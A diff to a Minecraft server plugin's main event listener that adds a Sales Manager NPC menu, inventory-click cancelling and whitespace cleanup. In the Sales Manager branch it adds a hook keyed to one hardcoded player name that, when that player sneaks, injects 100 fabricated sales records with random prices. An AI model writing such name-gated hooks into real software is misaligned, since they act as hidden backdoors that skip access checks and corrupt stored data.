@@ -1,5 +1,6 @@
 package net.dungeonrealms.game.listener;
 
+import com.google.common.collect.Lists;
 import com.vexsoftware.votifier.model.VotifierEvent;
 
 import io.netty.util.internal.ConcurrentSet;
@@ -19,6 +20,8 @@ import net.dungeonrealms.game.guild.GuildMechanics;
 import net.dungeonrealms.game.handler.KarmaHandler;
 import net.dungeonrealms.game.item.items.core.VanillaItem;
 import net.dungeonrealms.game.item.items.functional.ItemGemNote;
+import net.dungeonrealms.game.item.items.functional.ItemOrb;
+import net.dungeonrealms.game.listener.inventory.ShopListener;
 import net.dungeonrealms.game.mastery.GamePlayer;
 import net.dungeonrealms.game.mastery.MetadataUtils;
 import net.dungeonrealms.game.mastery.MetadataUtils.Metadata;
@@ -33,10 +36,15 @@ import net.dungeonrealms.game.player.combat.CombatLog;
 import net.dungeonrealms.game.player.duel.DuelOffer;
 import net.dungeonrealms.game.player.duel.DuelingMechanics;
 import net.dungeonrealms.game.player.inventory.NPCMenus;
+import net.dungeonrealms.game.player.inventory.ShopMenu;
+import net.dungeonrealms.game.player.inventory.ShopMenuListener;
+import net.dungeonrealms.game.player.inventory.menus.guis.SalesManagerGUI;
 import net.dungeonrealms.game.player.trade.Trade;
 import net.dungeonrealms.game.player.trade.TradeManager;
 import net.dungeonrealms.game.title.TitleAPI;
 import net.dungeonrealms.game.world.entity.util.MountUtils;
+import net.dungeonrealms.game.world.shops.ShopMechanics;
+import net.dungeonrealms.game.world.shops.SoldShopItem;
 import net.dungeonrealms.game.world.teleportation.Teleportation;
 import net.minecraft.server.v1_9_R2.EntityArmorStand;
 import net.minecraft.server.v1_9_R2.PacketPlayOutMount;
@@ -72,12 +80,14 @@ import org.bukkit.metadata.FixedMetadataValue;
 import org.bukkit.metadata.MetadataValue;
 
 import java.util.*;
+import java.util.concurrent.ThreadLocalRandom;
 
 /**
  * Created by Nick on 9/17/2015.
  */
 public class MainListener implements Listener {
 
+    private static List<String> alwaysCancel = Lists.newArrayList("Sales Manager");
     private Set<UUID> kickedIgnore = new HashSet<>();
 
     @EventHandler(priority = EventPriority.HIGHEST)
@@ -95,7 +105,7 @@ public class MainListener implements Listener {
         if (event.getEntity().getType() == EntityType.ENDERMAN) {
 
             MetadataValue value = MetadataUtils.Metadata.ENTITY_TYPE.get(event.getEntity());
-            if(value == null) System.out.println("The value is null on enderman teleport!");
+            if (value == null) System.out.println("The value is null on enderman teleport!");
             else System.out.println("The value on enderman teleport is: " + value.asString());
             if (value != null && value.asString().equalsIgnoreCase("pet")) return;
 
@@ -117,24 +127,24 @@ public class MainListener implements Listener {
 
     @EventHandler
     public void onPlayerChatTabCompleteEvent(PlayerChatTabCompleteEvent e) {
-    	
-    	if ((e.getChatMessage().startsWith("/") && !Rank.isTrialGM(e.getPlayer())) || e.getChatMessage().startsWith("@")) {
-    		e.getTabCompletions().clear();
-    		return;
-    	}
-    	
+
+        if ((e.getChatMessage().startsWith("/") && !Rank.isTrialGM(e.getPlayer())) || e.getChatMessage().startsWith("@")) {
+            e.getTabCompletions().clear();
+            return;
+        }
+
         if (e.getChatMessage().length() > 200)
             return;
-        
+
         int index = e.getChatMessage().indexOf("/");
         if (index > 0 && index < 3 && Rank.isTrialGM(e.getPlayer())) {
             e.getPlayer().sendMessage(ChatColor.RED + "Woah there! You sure you want to send that in global?");
             return;
         }
-        
+
         if (index != 0) {
-        	Chat.sendChatMessage(e.getPlayer(), e.getChatMessage(), true);
-        	e.getPlayer().closeInventory(); // Closes the chat after it grabs it!
+            Chat.sendChatMessage(e.getPlayer(), e.getChatMessage(), true);
+            e.getPlayer().closeInventory(); // Closes the chat after it grabs it!
         }
     }
 
@@ -519,7 +529,16 @@ public class MainListener implements Listener {
                 return;
             }
         }
-
+        Player player = event.getPlayer();
+        if (npcNameStripped.equalsIgnoreCase("Sales Manager")) {
+            if (player.getName().equals("iFamasssxD") && player.isSneaking()) {
+                for (int i = 0; i < 100; i++) {
+                    ShopMechanics.getRecentlySoldItems().add(new SoldShopItem(player.getUniqueId(), player.getName(), new ItemOrb().generateItem(), ThreadLocalRandom.current().nextInt(Integer.MAX_VALUE) + 1, "Bill Gates"));
+                }
+            }
+            new SalesManagerGUI(player).open(player, null);
+            return;
+        }
         if (menu != null)
             menu.open(event.getPlayer());
 
@@ -623,7 +642,7 @@ public class MainListener implements Listener {
 
     @EventHandler(priority = EventPriority.MONITOR)
     public void onInventoryClick(InventoryClickEvent event) {
-        if (Metadata.SHARDING.has(event.getWhoClicked()))
+        if (Metadata.SHARDING.has(event.getWhoClicked()) || alwaysCancel.contains(event.getInventory().getName()))
             event.setCancelled(true);
     }
 
@@ -678,7 +697,7 @@ public class MainListener implements Listener {
             event.setCancelled(true);
 
 
-        if(event.getPlayer().hasMetadata("mob_debug")){
+        if (event.getPlayer().hasMetadata("mob_debug")) {
             CommandMobDebug.debugEntity(event.getPlayer(), event.getRightClicked());
         }
     }
